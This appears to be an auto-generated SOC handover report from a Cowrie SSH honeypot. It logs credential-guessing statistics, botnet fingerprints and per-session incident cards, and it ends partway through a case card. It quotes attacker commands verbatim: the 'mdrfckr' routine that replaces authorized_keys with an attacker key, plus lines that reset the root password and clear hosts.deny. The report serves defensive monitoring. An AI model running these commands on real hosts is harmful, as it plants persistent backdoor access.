# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-02 |
| **Generated At** | 2026-06-02T20:54:45Z |
| **Shift Time** | 20:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **626** |
| Confirmed Threats | **517** |
| False Positives Filtered | **109** (17.4%) |
| Unique Attacker IPs | **61** |
| Countries of Origin | **25** |
| High Severity Cases | **175** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **451** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **430** |
| Unique Credential Pairs | **243** |
| Unique Usernames | **149** |
| Unique Passwords | **207** |
| Successful Auth Pairs | **110** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 175 |
| `345gs5662d34` | 88 |
| `test` | 4 |
| `ubuntu` | 4 |
| `admin` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 88 |
| `3245gs5662d34` | 86 |
| `123456` | 21 |
| `123` | 7 |
| `12345678` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 88 |
| `root` | `3245gs5662d34` | 86 |
| `root` | `@qwer2025` | 3 |
| `root` | `nE7jANo` | 2 |
| `root` | `ZAQ12WSX` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `temptemp` | `190.151.130.5` | 2026-06-02T16:42:10 |
| `root` | `3245gs5662d34` | `190.151.130.5` | 2026-06-02T16:42:16 |
| `root` | `qazwsx123!@` | `107.0.200.227` | 2026-06-02T16:42:28 |
| `root` | `3245gs5662d34` | `107.0.200.227` | 2026-06-02T16:42:35 |
| `root` | `Xx123123` | `190.151.130.5` | 2026-06-02T16:46:21 |
| `root` | `Ab1234567` | `190.151.130.5` | 2026-06-02T16:50:12 |
| `root` | `command` | `107.0.200.227` | 2026-06-02T16:51:40 |
| `root` | `!Q2w#E4r` | `190.151.130.5` | 2026-06-02T16:52:04 |
| `root` | `1a2b3c4d@` | `190.151.130.5` | 2026-06-02T16:53:51 |
| `root` | `qwerty08` | `107.0.200.227` | 2026-06-02T16:55:13 |
| `root` | `zxcvbnm2025` | `107.0.200.227` | 2026-06-02T16:57:11 |
| `root` | `123654789` | `190.151.130.5` | 2026-06-02T16:57:51 |
| `root` | `01020304` | `125.21.59.218` | 2026-06-02T16:59:33 |
| `root` | `3245gs5662d34` | `125.21.59.218` | 2026-06-02T16:59:34 |
| `root` | `123456zxc` | `190.151.130.5` | 2026-06-02T16:59:50 |
| `root` | `Admin@123!` | `125.21.59.218` | 2026-06-02T17:01:42 |
| `root` | `Abcd!234` | `107.0.200.227` | 2026-06-02T17:02:11 |
| `root` | `lemon123` | `125.21.59.218` | 2026-06-02T17:03:49 |
| `root` | `Admin_123` | `107.0.200.227` | 2026-06-02T17:04:09 |
| `root` | `1234Qwer` | `125.21.59.218` | 2026-06-02T17:05:54 |
| `root` | `Pa$$w0rd2025` | `190.151.130.5` | 2026-06-02T17:07:26 |
| `root` | `@dm1n123` | `125.21.59.218` | 2026-06-02T17:07:58 |
| `root` | `David2025` | `190.151.130.5` | 2026-06-02T17:11:12 |
| `root` | `Talent@123` | `125.21.59.218` | 2026-06-02T17:12:09 |
| `root` | `adminme` | `125.21.59.218` | 2026-06-02T17:16:23 |
| `root` | `P@ssw0rd#2026` | `107.0.200.227` | 2026-06-02T17:19:03 |
| `root` | `Robin123` | `190.151.130.5` | 2026-06-02T17:22:36 |
| `root` | `@Bismillah123` | `101.126.24.58` | 2026-06-02T17:23:30 |
| `root` | `3245gs5662d34` | `101.126.24.58` | 2026-06-02T17:23:43 |
| `root` | `Admin123!!!` | `190.151.130.5` | 2026-06-02T17:26:17 |
| `root` | `Salam@123` | `190.151.130.5` | 2026-06-02T17:32:00 |
| `root` | `password123!@#` | `190.151.130.5` | 2026-06-02T17:33:57 |
| `root` | `Sugipula123$` | `190.151.130.5` | 2026-06-02T17:35:54 |
| `root` | `Xj123456` | `107.0.200.227` | 2026-06-02T17:37:03 |
| `root` | `Qwerty_1` | `107.0.200.227` | 2026-06-02T17:40:43 |
| `root` | `P@ssword2025!` | `107.0.200.227` | 2026-06-02T17:44:24 |
| `root` | `zx123123` | `45.78.207.244` | 2026-06-02T17:44:41 |
| `root` | `3245gs5662d34` | `45.78.207.244` | 2026-06-02T17:44:51 |
| `root` | `Pass@123456` | `45.78.207.244` | 2026-06-02T17:46:43 |
| `root` | `mima1234` | `45.78.207.244` | 2026-06-02T17:49:03 |
| `root` | `Abbas@123` | `45.78.207.244` | 2026-06-02T17:53:10 |
| `root` | `lin123456` | `45.78.207.244` | 2026-06-02T18:05:03 |
| `root` | `qwe!@123QWE` | `45.78.207.244` | 2026-06-02T18:14:54 |
| `root` | `administrator` | `45.78.207.244` | 2026-06-02T18:16:52 |
| `root` | `Cq123456` | `45.78.207.244` | 2026-06-02T18:19:30 |
| `root` | `nE7jANo` | `45.78.207.244` | 2026-06-02T18:31:28 |
| `root` | `123456789@` | `45.78.207.244` | 2026-06-02T18:35:28 |
| `root` | `2003` | `45.78.207.244` | 2026-06-02T18:37:24 |
| `root` | `0101` | `45.78.207.244` | 2026-06-02T18:41:21 |
| `root` | `11111111` | `36.95.194.52` | 2026-06-02T18:46:58 |
| `root` | `3245gs5662d34` | `36.95.194.52` | 2026-06-02T18:47:01 |
| `root` | `jack1234` | `45.64.74.51` | 2026-06-02T18:50:38 |
| `root` | `3245gs5662d34` | `45.64.74.51` | 2026-06-02T18:50:41 |
| `root` | `cloud1234` | `45.64.74.51` | 2026-06-02T18:54:24 |
| `root` | `joao` | `173.212.228.191` | 2026-06-02T18:55:02 |
| `root` | `3245gs5662d34` | `173.212.228.191` | 2026-06-02T18:55:06 |
| `root` | `2026.` | `45.64.74.51` | 2026-06-02T18:56:11 |
| `root` | `node2026` | `173.212.228.191` | 2026-06-02T18:56:41 |
| `root` | `aspire` | `45.64.74.51` | 2026-06-02T18:57:59 |
| `root` | `admin#2026` | `173.212.228.191` | 2026-06-02T19:01:24 |
| `root` | `admin@root` | `45.64.74.51` | 2026-06-02T19:01:28 |
| `root` | `Aa123456..` | `45.64.74.51` | 2026-06-02T19:03:12 |
| `root` | `3030` | `45.64.74.51` | 2026-06-02T19:05:02 |
| `root` | `1234567890!` | `45.64.74.51` | 2026-06-02T19:06:51 |
| `root` | `Start1234` | `45.64.74.51` | 2026-06-02T19:08:42 |
| `root` | `teste` | `45.64.74.51` | 2026-06-02T19:12:25 |
| `root` | `@qwer2025` | `92.112.126.183` | 2026-06-02T19:14:41 |
| `root` | `3245gs5662d34` | `92.112.126.183` | 2026-06-02T19:14:45 |
| `root` | `ZAQ12WSX` | `45.64.74.51` | 2026-06-02T19:21:08 |
| `root` | `Qwertyuiop2025` | `45.64.74.51` | 2026-06-02T19:23:06 |
| `root` | `Abc@2025` | `45.64.74.51` | 2026-06-02T19:24:58 |
| `root` | `Tc@123456` | `45.64.74.51` | 2026-06-02T19:26:46 |
| `root` | `root-1234` | `45.64.74.51` | 2026-06-02T19:30:29 |
| `root` | `20202020` | `45.64.74.51` | 2026-06-02T19:33:59 |
| `root` | `P@ssw0rd1234` | `45.64.74.51` | 2026-06-02T19:35:46 |
| `root` | `admin2025$` | `45.64.74.51` | 2026-06-02T19:39:13 |
| `root` | `Pass@1234` | `122.166.49.42` | 2026-06-02T19:48:49 |
| `root` | `3245gs5662d34` | `122.166.49.42` | 2026-06-02T19:48:51 |
| `root` | `@qwer2025` | `91.92.199.36` | 2026-06-02T20:12:16 |
| `root` | `3245gs5662d34` | `91.92.199.36` | 2026-06-02T20:12:20 |
| `root` | `ZAQ12WSX` | `192.142.2.40` | 2026-06-02T20:15:47 |
| `root` | `3245gs5662d34` | `192.142.2.40` | 2026-06-02T20:15:54 |
| `root` | `Pambazuka08` | `200.236.4.245` | 2026-06-02T20:25:53 |
| `root` | `3245gs5662d34` | `200.236.4.245` | 2026-06-02T20:26:01 |
| `root` | `p@ss2025` | `50.116.72.139` | 2026-06-02T20:32:15 |
| `root` | `3245gs5662d34` | `50.116.72.139` | 2026-06-02T20:32:21 |
| `root` | `Root2026..` | `8.154.4.21` | 2026-06-02T20:33:22 |
| `root` | `3245gs5662d34` | `8.154.4.21` | 2026-06-02T20:33:26 |
| `root` | `Welcome2025!` | `50.116.72.139` | 2026-06-02T20:37:54 |
| `root` | `asdf1234@` | `197.221.232.44` | 2026-06-02T20:38:29 |
| `root` | `3245gs5662d34` | `197.221.232.44` | 2026-06-02T20:38:37 |
| `root` | `p@ss2025` | `161.35.65.86` | 2026-06-02T20:38:41 |
| `root` | `3245gs5662d34` | `161.35.65.86` | 2026-06-02T20:38:44 |
| `root` | `12345678910` | `161.35.65.86` | 2026-06-02T20:40:22 |
| `root` | `Sl123456@` | `161.35.65.86` | 2026-06-02T20:41:57 |
| `root` | `Ab-123456` | `42.200.66.164` | 2026-06-02T20:42:31 |
| `root` | `3245gs5662d34` | `42.200.66.164` | 2026-06-02T20:42:35 |
| `root` | `@qwer2025` | `54.37.74.179` | 2026-06-02T20:45:01 |
| `root` | `3245gs5662d34` | `54.37.74.179` | 2026-06-02T20:45:05 |
| `root` | `Root123456@` | `46.24.47.94` | 2026-06-02T20:46:53 |
| `root` | `Qwerty78` | `54.37.74.179` | 2026-06-02T20:46:53 |
| `root` | `3245gs5662d34` | `46.24.47.94` | 2026-06-02T20:46:59 |
| `root` | `1qaz!QAZ2wsx` | `42.200.66.164` | 2026-06-02T20:47:57 |
| `root` | `Welcome2025!` | `161.35.65.86` | 2026-06-02T20:48:29 |
| `root` | `nE7jANo` | `46.24.47.94` | 2026-06-02T20:48:40 |
| `root` | `P@ssw0rd!@#` | `54.37.74.179` | 2026-06-02T20:50:28 |
| `root` | `rootuser` | `42.200.66.164` | 2026-06-02T20:51:35 |
| `root` | `Ab-123456` | `197.221.232.44` | 2026-06-02T20:52:27 |
| `root` | `m123456` | `104.208.108.166` | 2026-06-02T20:52:56 |
| `root` | `3245gs5662d34` | `104.208.108.166` | 2026-06-02T20:52:59 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **626** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 444 |
| Go SSH scanner | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 385 | 27 |
| `af8223ac9914...` | libssh-based | 45 | 2 |
| `03a80b21afa8...` | Modern SSH client | 7 | 3 |
| `16443846184e...` | Generic scanner | 3 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 385 | 27 | Mirai/variant |
| `af8223ac9914...` | libssh | 45 | 2 | libssh-based |
| `03a80b21afa8...` | libssh | 7 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 7 | 4 | — |
| `16443846184e...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 86 | 21 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:6J4YdoIEcaTM"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `45.78.207.244`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `122.166.49.42`, `107.0.200.227`, `46.24.47.94`, `161.35.65.86`, `125.21.59.218`, `190.151.130.5`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **61** |
| Unique ASNs | **45** |
| High-Risk ASNs | **39** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS396982` | Google LLC | 4 | LOW |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS211298` | Driftnet Ltd | 2 | HIGH |
| `AS150436` | Byteplus Pte. Ltd. | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (175)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2d583f2494bf

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 16:42 |
| **Last Seen** | 2026-06-02 16:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:42:09` | `cowrie.session.connect` |
| `2026-06-02 16:42:09` | `cowrie.client.version` |
| `2026-06-02 16:42:09` | `cowrie.client.kex` |
| `2026-06-02 16:42:10` | `cowrie.login.success` |
| `2026-06-02 16:42:10` | `cowrie.session.params` |
| `2026-06-02 16:42:10` | `cowrie.command.input` |
| `2026-06-02 16:42:10` | `cowrie.command.failed` |
| `2026-06-02 16:42:11` | `cowrie.log.closed` |
| `2026-06-02 16:42:11` | `cowrie.session.params` |
| `2026-06-02 16:42:11` | `cowrie.command.input` |
| `2026-06-02 16:42:11` | `cowrie.session.file_download` |
| `2026-06-02 16:42:11` | `cowrie.log.closed` |
| `2026-06-02 16:42:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f1949e0cdac

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 16:42 |
| **Last Seen** | 2026-06-02 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:42:14` | `cowrie.session.connect` |
| `2026-06-02 16:42:14` | `cowrie.client.version` |
| `2026-06-02 16:42:15` | `cowrie.client.kex` |
| `2026-06-02 16:42:16` | `cowrie.login.success` |
| `2026-06-02 16:42:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4355014e952

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 16:42 |
| **Last Seen** | 2026-06-02 16:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:42:27` | `cowrie.session.connect` |
| `2026-06-02 16:42:27` | `cowrie.client.version` |
| `2026-06-02 16:42:27` | `cowrie.client.kex` |
| `2026-06-02 16:42:28` | `cowrie.login.success` |
| `2026-06-02 16:42:29` | `cowrie.session.params` |
| `2026-06-02 16:42:29` | `cowrie.command.input` |
| `2026-06-02 16:42:29` | `cowrie.command.failed` |
| `2026-06-02 16:42:30` | `cowrie.log.closed` |
| `2026-06-02 16:42:30` | `cowrie.session.params` |
| `2026-06-02 16:42:30` | `cowrie.command.input` |
| `2026-06-02 16:42:30` | `cowrie.session.file_download` |
| `2026-06-02 16:42:30` | `cowrie.log.closed` |
| `2026-06-02 16:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1077fd4a81ee

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 16:42 |
| **Last Seen** | 2026-06-02 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:42:33` | `cowrie.session.connect` |
| `2026-06-02 16:42:33` | `cowrie.client.version` |
| `2026-06-02 16:42:34` | `cowrie.client.kex` |
| `2026-06-02 16:42:35` | `cowrie.login.success` |
| `2026-06-02 16:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b3278078875

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 16:46 |
| **Last Seen** | 2026-06-02 16:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:46:20` | `cowrie.session.connect` |
| `2026-06-02 16:46:20` | `cowrie.client.version` |
| `2026-06-02 16:46:20` | `cowrie.client.kex` |
| `2026-06-02 16:46:21` | `cowrie.login.success` |
| `2026-06-02 16:46:22` | `cowrie.session.params` |
| `2026-06-02 16:46:22` | `cowrie.command.input` |
| `2026-06-02 16:46:22` | `cowrie.command.failed` |
| `2026-06-02 16:46:22` | `cowrie.log.closed` |
| `2026-06-02 16:46:22` | `cowrie.session.params` |
| `2026-06-02 16:46:22` | `cowrie.command.input` |
| `2026-06-02 16:46:23` | `cowrie.session.file_download` |
| `2026-06-02 16:46:23` | `cowrie.log.closed` |
| `2026-06-02 16:46:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fc4cdaee731

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 16:46 |
| **Last Seen** | 2026-06-02 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:46:26` | `cowrie.session.connect` |
| `2026-06-02 16:46:26` | `cowrie.client.version` |
| `2026-06-02 16:46:26` | `cowrie.client.kex` |
| `2026-06-02 16:46:27` | `cowrie.login.success` |
| `2026-06-02 16:46:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f41557645b0e

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 16:50 |
| **Last Seen** | 2026-06-02 16:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:50:10` | `cowrie.session.connect` |
| `2026-06-02 16:50:10` | `cowrie.client.version` |
| `2026-06-02 16:50:11` | `cowrie.client.kex` |
| `2026-06-02 16:50:12` | `cowrie.login.success` |
| `2026-06-02 16:50:12` | `cowrie.session.params` |
| `2026-06-02 16:50:12` | `cowrie.command.input` |
| `2026-06-02 16:50:12` | `cowrie.command.failed` |
| `2026-06-02 16:50:13` | `cowrie.log.closed` |
| `2026-06-02 16:50:13` | `cowrie.session.params` |
| `2026-06-02 16:50:13` | `cowrie.command.input` |
| `2026-06-02 16:50:13` | `cowrie.session.file_download` |
| `2026-06-02 16:50:13` | `cowrie.log.closed` |
| `2026-06-02 16:50:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c35b56a81534

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 16:50 |
| **Last Seen** | 2026-06-02 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:50:16` | `cowrie.session.connect` |
| `2026-06-02 16:50:16` | `cowrie.client.version` |
| `2026-06-02 16:50:17` | `cowrie.client.kex` |
| `2026-06-02 16:50:18` | `cowrie.login.success` |
| `2026-06-02 16:50:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dd4424d2d15

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
